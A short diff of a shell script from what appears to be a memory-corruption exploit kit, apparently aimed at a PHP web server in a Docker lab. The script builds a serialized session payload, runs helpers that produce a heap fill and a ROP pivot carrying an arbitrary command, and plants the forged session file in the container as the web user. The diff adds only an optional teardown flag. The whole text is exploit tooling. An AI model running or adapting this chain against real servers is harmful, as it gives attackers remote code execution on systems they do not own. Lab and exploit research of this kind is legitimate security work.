@@ -126,7 +126,7 @@ printf 'p1|i:1;p2|i:1;p3|i:1;p4|i:%d;p5|i:%d;p6|i:%d;p7|i:16;p8|i:%d;' \
 python3 "$HERE/mk_native_fill.py" --d "$D" --heap "$HEAP" \
     --infile "$HERE/payload/fillU.bin" --out /tmp/pivot_base.bin --nogdb >/dev/null
 python3 "$HERE/mk_rop_pivot.py" --d "$D" --base "$BASE" \
-    --base-fill /tmp/pivot_base.bin --out /tmp/pivot_fill.bin --cmd "$CMD"
+    --base-fill /tmp/pivot_base.bin --out /tmp/pivot_fill.bin --cmd "$CMD" ${TEARDOWN:+--teardown}
 echo -n "[sess] "; cat /tmp/pivot_sess_T; echo
 docker cp /tmp/pivot_sess_T "$NAME:/tmp/sess_$EB" >/dev/null
 docker exec "$NAME" chown 33:33 "/tmp/sess_$EB"
